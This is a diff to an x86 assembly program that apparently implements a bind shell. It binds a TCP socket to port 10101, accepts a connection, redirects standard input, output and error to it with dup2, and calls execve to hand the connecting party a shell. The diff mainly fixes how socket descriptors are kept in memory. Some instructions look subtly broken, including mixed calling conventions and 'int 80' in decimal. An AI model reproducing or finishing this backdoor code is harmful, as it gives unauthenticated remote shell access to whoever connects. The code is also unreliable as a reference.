@@ -3,7 +3,7 @@
 
 .section .data
   sock: .long 0    
-  fd: .long 0   
+  fd: .long 0    
 
 .section .text
   .global main
@@ -13,49 +13,47 @@ main:
     push SOCK_STREAM
     push IPPROTO_TCP
     call socket
-    mov eax, socket 
+    mov sock, eax
 
-    mov ebx, eax  
     mov eax, AF_INET
     mov [sin + 0], eax
-
-    mov ecx, 10101 
+    mov eax, 10101
     call htons
     mov [sin + 4], eax
+    mov eax, 0
+    mov [sin + 8], eax
 
-    mov eax, ebx 
+    mov eax, sock
     mov ebx, sin
-    mov ecx, 12 
+    mov ecx, 12
     call bind
 
-    mov eax, ebx  
+    mov eax, sock
     mov ecx, 1
     call listen
 
-    mov eax, ebx  
+    mov eax, sock
     mov ebx, NULL
     mov ecx, NULL
     call accept
-    mov edx, eax
+    mov fd, eax
 
-    mov eax, edx
-    mov ebx, 0 
+    mov eax, fd
+    mov ebx, 0
     call dup2
 
-    mov eax, edx
-    mov ebx, 1 
+    mov eax, fd
+    mov ebx, 1
     call dup2
 
-    mov eax, edx
-    mov ebx, 2 
+    mov eax, fd
+    mov ebx, 2
     call dup2
 
-    mov ebx, [esp + 4] 
-    push 0 
+    mov ebx, [esp + 4]
+    push 0
     call execve
 
     mov eax, 1
     mov ebx, 0
     int 80
-
-
